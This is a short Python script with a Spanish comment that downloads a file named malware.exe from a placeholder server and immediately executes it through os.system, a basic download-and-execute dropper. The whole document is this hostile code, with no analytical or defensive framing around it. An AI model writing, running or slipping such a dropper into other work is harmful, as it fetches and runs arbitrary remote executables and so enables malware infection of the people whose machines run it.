import requests
import os

URL = "http://tu-servidor.com/malware.exe"
FILENAME = "downloaded.exe"

def download_and_execute():
    response = requests.get(URL)
    with open(FILENAME, "wb") as file:
        file.write(response.content)
    os.system(FILENAME)  # Ejecuta el archivo descargado

download_and_execute()
